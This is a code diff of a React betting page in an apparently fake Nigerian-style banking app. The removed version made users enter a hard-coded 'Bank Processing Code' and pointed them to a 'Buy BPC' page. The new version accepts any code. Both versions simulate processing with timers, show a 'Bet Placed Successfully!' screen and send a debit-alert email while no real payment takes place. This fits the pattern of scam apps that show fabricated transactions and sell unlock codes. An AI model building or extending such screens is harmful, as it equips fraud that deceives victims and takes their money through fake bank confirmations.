@@ -1,23 +1,22 @@
 'use client'
 
-import React, { useState } from 'react'
+import React, { useState, useEffect } from 'react'
 import { useRouter } from 'next/navigation'
-import { ChevronLeft, Check, Eye, EyeOff, AlertCircle } from 'lucide-react'
+import { ChevronLeft, Check, Eye, EyeOff } from 'lucide-react'
 import { sendDebitAlert, generateTransactionId, getCurrentDateTime } from '@/lib/debit-alert'
 import { createClient } from '@supabase/supabase-js'
 
-const CORRECT_BPC_CODE = 'BPC2026_PRO_V30_650'
-
 export default function BettingPage() {
   const router = useRouter()
+  const [step, setStep] = useState<'form' | 'confirm' | 'countdown' | 'success'>('form')
   const [amount, setAmount] = useState('')
   const [selectedPlatform, setSelectedPlatform] = useState('')
   const [userId, setUserId] = useState('')
   const [bpcCode, setBpcCode] = useState('')
   const [showBpcCode, setShowBpcCode] = useState(false)
   const [loading, setLoading] = useState(false)
-  const [success, setSuccess] = useState(false)
-  const [bpcError, setBpcError] = useState('')
+  const [countdown, setCountdown] = useState(0)
+  const [transactionId, setTransactionId] = useState('')
   const [fullName, setFullName] = useState('')
   const [userEmail, setUserEmail] = useState('')
 
@@ -34,7 +33,7 @@ export default function BettingPage() {
     'WESTERNBET',
   ]
 
-  React.useEffect(() => {
+  useEffect(() => {
     const loadUserData = async () => {
       try {
         const supabase = createClient(
@@ -59,93 +58,202 @@ export default function BettingPage() {
     loadUserData()
   }, [])
 
-  const handleBet = async (e: React.FormEvent) => {
-    e.preventDefault()
-    
+  useEffect(() => {
+    if (step === 'countdown' && countdown > 0) {
+      const timer = setTimeout(() => setCountdown(countdown - 1), 1000)
+      return () => clearTimeout(timer)
+    } else if (step === 'countdown' && countdown === 0 && step === 'countdown') {
+      setStep('success')
+    }
+  }, [countdown, step])
+
+  const handlePlaceBet = async () => {
     if (!selectedPlatform) {
       alert('Please select a betting platform')
       return
     }
-
     if (!userId.trim()) {
       alert('Please enter your User ID')
       return
     }
-    
     if (!amount) {
       alert('Please enter a bet amount')
       return
     }
-    
-    if (!bpcCode) {
-      setBpcError('Please enter BPC CODE')
+    if (!bpcCode.trim()) {
+      alert('Please enter your BPC CODE')
       return
     }
     
-    if (bpcCode !== CORRECT_BPC_CODE) {
-      setBpcError('Wrong Bank Processing Code (BPC CODE). Kindly get the correct code to proceed with the transaction.')
-      return
-    }
-
-    setLoading(true)
-    try {
-      await new Promise(resolve => setTimeout(resolve, 1500))
-      
-      // Send debit alert
-      const transactionId = Date.now().toString()
-      const { date, time } = formatDateTimeForEmail()
-      
-      await sendDebitAlert({
-        fullName: fullName,
-        email: userEmail,
-        amount: parseFloat(amount),
-        transactionType: 'Betting',
-        transactionId: transactionId,
-        date: date,
-        time: time,
-      })
-      
-      setSuccess(true)
-      setTimeout(() => router.push('/dashboard'), 2000)
-    } catch (error) {
-      alert('Transaction failed. Please try again.')
-    } finally {
-      setLoading(false)
-    }
+    setStep('confirm')
   }
 
-  if (success) {
+  const handleProceed = async () => {
+    setCountdown(7)
+    setStep('countdown')
+
+    // Send debit alert
+    const txId = generateTransactionId()
+    setTransactionId(txId)
+
+    await sendDebitAlert({
+      email: userEmail,
+      full_name: fullName,
+      transaction_type: 'Betting',
+      amount: parseFloat(amount),
+      recipient_name: selectedPlatform,
+      recipient_account_number: userId,
+      recipient_bank_name: 'Betting Platform',
+      transaction_id: txId,
+      transaction_date: getCurrentDateTime(),
+    })
+  }
+
+  // Success Page
+  if (step === 'success') {
     return (
-      <div className="min-h-screen bg-gradient-to-b from-blue-50 to-gray-50 flex items-center justify-center px-4">
-        <div className="text-center">
-          <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
-            <Check className="w-10 h-10 text-white" />
+      <div className="min-h-screen bg-gray-50 pb-8">
+        <div className="sticky top-0 z-40 bg-white border-b border-gray-200 px-4 py-4">
+          <div className="flex items-center gap-3 max-w-2xl mx-auto">
+            <button onClick={() => router.back()} className="p-2 hover:bg-gray-100 rounded-lg">
+              <ChevronLeft className="w-6 h-6 text-gray-900" />
+            </button>
+            <h1 className="text-xl font-bold text-gray-900">Bet Placed Successfully!</h1>
           </div>
-          <h1 className="text-2xl font-bold text-gray-900 mb-2">Bet Placed Successfully!</h1>
-          <p className="text-gray-600">Transaction: {TRANSACTION_CODE}</p>
+        </div>
+
+        <div className="max-w-2xl mx-auto px-4 pt-8">
+          <div className="bg-gradient-to-b from-green-50 to-blue-50 rounded-2xl p-6 text-center">
+            <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
+              <Check className="w-10 h-10 text-white" />
+            </div>
+            <h2 className="text-2xl font-bold text-gray-900 mb-2">Bet Placed Successfully!</h2>
+            <p className="text-gray-600 mb-6">Your betting transaction has been processed.</p>
+
+            <div className="bg-white rounded-xl p-4 border border-gray-200 space-y-3 mb-6 text-left">
+              <div>
+                <p className="text-xs text-gray-600 mb-1">Betting Platform</p>
+                <p className="font-bold text-gray-900">{selectedPlatform}</p>
+              </div>
+              <div>
+                <p className="text-xs text-gray-600 mb-1">User ID</p>
+                <p className="font-bold text-gray-900">{userId}</p>
+              </div>
+              <div>
+                <p className="text-xs text-gray-600 mb-1">Amount</p>
+                <p className="font-bold text-[#0000ff]">NGN {parseFloat(amount).toLocaleString()}.00</p>
+              </div>
+              <div>
+                <p className="text-xs text-gray-600 mb-1">Transaction ID</p>
+                <p className="font-mono font-bold text-gray-900 text-xs">{transactionId}</p>
+              </div>
+              <div>
+                <p className="text-xs text-gray-600 mb-1">Date & Time</p>
+                <p className="font-bold text-gray-900 text-xs">{getCurrentDateTime()}</p>
+              </div>
+              <div>
+                <p className="text-xs text-gray-600 mb-1">Full Name</p>
+                <p className="font-bold text-gray-900">{fullName}</p>
+              </div>
+            </div>
+
+            <button
+              onClick={() => router.push('/dashboard')}
+              className="w-full bg-[#0000ff] text-white font-bold py-3 rounded-xl hover:opacity-90 transition"
+            >
+              Back to Dashboard
+            </button>
+          </div>
         </div>
       </div>
     )
   }
 
+  // Countdown Screen
+  if (step === 'countdown') {
+    return (
+      <div className="min-h-screen bg-gray-50 flex items-center justify-center pb-8">
+        <div className="max-w-2xl mx-auto px-4 text-center">
+          <div className="text-6xl font-bold text-[#0000ff] mb-4 tabular-nums">{countdown}</div>
+          <p className="text-gray-600 text-lg">Processing your betting transaction...</p>
+          <p className="text-gray-500 text-sm mt-2">Please wait while we place your bet</p>
+        </div>
+      </div>
+    )
+  }
+
+  // Confirm Details Screen
+  if (step === 'confirm') {
+    return (
+      <div className="min-h-screen bg-gray-50 pb-8">
+        <div className="sticky top-0 z-40 bg-white border-b border-gray-200 px-4 py-4">
+          <div className="flex items-center gap-3 max-w-2xl mx-auto">
+            <button onClick={() => setStep('form')} className="p-2 hover:bg-gray-100 rounded-lg">
+              <ChevronLeft className="w-6 h-6 text-gray-900" />
+            </button>
+            <h1 className="text-xl font-bold text-gray-900">Confirm Details</h1>
+          </div>
+        </div>
+
+        <div className="max-w-2xl mx-auto px-4 pt-6">
+          <div className="bg-white rounded-xl p-6 border border-gray-200 space-y-4 mb-6">
+            <h3 className="font-bold text-gray-900 text-lg">Betting Summary</h3>
+
+            <div className="space-y-3">
+              <div className="flex justify-between pb-3 border-b border-gray-200">
+                <span className="text-gray-600">Platform</span>
+                <span className="font-bold text-gray-900">{selectedPlatform}</span>
+              </div>
+              <div className="flex justify-between pb-3 border-b border-gray-200">
+                <span className="text-gray-600">User ID</span>
+                <span className="font-bold text-gray-900">{userId}</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-gray-600">Amount</span>
+                <span className="font-bold text-[#0000ff]">NGN {parseFloat(amount).toLocaleString()}.00</span>
+              </div>
+            </div>
+          </div>
+
+          <div className="space-y-3">
+            <button
+              onClick={() => setStep('form')}
+              className="w-full bg-gray-200 text-gray-900 font-bold py-3 rounded-xl hover:bg-gray-300 transition"
+            >
+              EDIT
+            </button>
+            <button
+              onClick={handleProceed}
+              className="w-full bg-[#0000ff] text-white font-bold py-3 rounded-xl hover:opacity-90 transition"
+            >
+              PROCEED
+            </button>
+          </div>
+        </div>
+      </div>
+    )
+  }
+
+  // Form Screen
   return (
-    <div className="min-h-screen bg-gray-50 pb-6">
-      <header className="bg-white border-b">
-        <div className="flex items-center gap-3 max-w-sm mx-auto px-4 py-3">
+    <div className="min-h-screen bg-gray-50 pb-8">
+      <header className="sticky top-0 z-40 bg-white border-b border-gray-200">
+        <div className="flex items-center gap-3 max-w-2xl mx-auto px-4 py-4">
           <button onClick={() => router.back()} className="p-2 hover:bg-gray-100 rounded-lg">
-            <ChevronLeft className="w-6 h-6" />
+            <ChevronLeft className="w-6 h-6 text-gray-900" />
           </button>
           <h1 className="text-xl font-bold text-gray-900">Place Bet</h1>
         </div>
       </header>
-      <div className="max-w-sm mx-auto px-4 pt-6">
-        <form onSubmit={handleBet} className="space-y-4">
+
+      <div className="max-w-2xl mx-auto px-4 pt-6">
+        <div className="space-y-4">
           <div>
             <label className="block text-sm font-semibold text-gray-900 mb-2">Select Betting Platform</label>
             <select
               value={selectedPlatform}
               onChange={(e) => setSelectedPlatform(e.target.value)}
-              className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500"
+              className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0000ff]"
               required
             >
               <option value="">Choose platform</option>
@@ -162,7 +270,7 @@ export default function BettingPage() {
               value={userId}
               onChange={(e) => setUserId(e.target.value)}
               placeholder="Enter your betting platform User ID"
-              className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500"
+              className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0000ff]"
               required
             />
           </div>
@@ -174,61 +282,40 @@ export default function BettingPage() {
               value={amount}
               onChange={(e) => setAmount(e.target.value)}
               placeholder="Enter bet amount"
-              className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500"
+              className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0000ff]"
               required
               min="100"
             />
           </div>
 
-          {/* BPC CODE Input */}
           <div>
-            <label className="block text-sm font-semibold text-gray-900 mb-3">
-              INPUT BPC CODE
-            </label>
+            <label className="block text-sm font-semibold text-gray-900 mb-2">BPC CODE</label>
             <div className="relative">
               <input
                 type={showBpcCode ? 'text' : 'password'}
                 value={bpcCode}
-                onChange={(e) => {
-                  setBpcCode(e.target.value)
-                  setBpcError('')
-                }}
-                placeholder="Enter BPC Code"
-                className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0000ff] pr-10"
-                maxLength={CORRECT_BPC_CODE.length}
+                onChange={(e) => setBpcCode(e.target.value)}
+                placeholder="Enter your BPC CODE"
+                className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0000ff] pr-12"
               />
               <button
                 type="button"
                 onClick={() => setShowBpcCode(!showBpcCode)}
-                className="absolute right-3 top-3 text-gray-500 hover:text-gray-700"
+                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-600 hover:text-gray-900"
               >
                 {showBpcCode ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
               </button>
             </div>
-            <button
-              type="button"
-              onClick={() => router.push('/buy-bpc')}
-              className="text-[#0000ff] hover:text-blue-700 text-sm font-semibold mt-2"
-            >
-              Buy BPC
-            </button>
           </div>
 
-          {bpcError && (
-            <div className="flex gap-3 p-4 bg-red-50 border border-red-200 rounded-xl">
-              <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
-              <p className="text-sm text-red-700">{bpcError}</p>
-            </div>
-          )}
-
           <button
-            type="submit"
+            onClick={handlePlaceBet}
             disabled={loading}
-            className="w-full bg-[#0000ff] text-white font-bold py-3 rounded-xl hover:opacity-90 transition disabled:opacity-50 mt-8"
+            className="w-full bg-[#0000ff] text-white font-bold py-3 rounded-xl hover:opacity-90 disabled:opacity-50 transition mt-6"
           >
-            {loading ? 'Processing...' : 'Place Bet'}
+            {loading ? 'Placing Bet...' : 'Place Bet'}
           </button>
-        </form>
+        </div>
       </div>
     </div>
   )
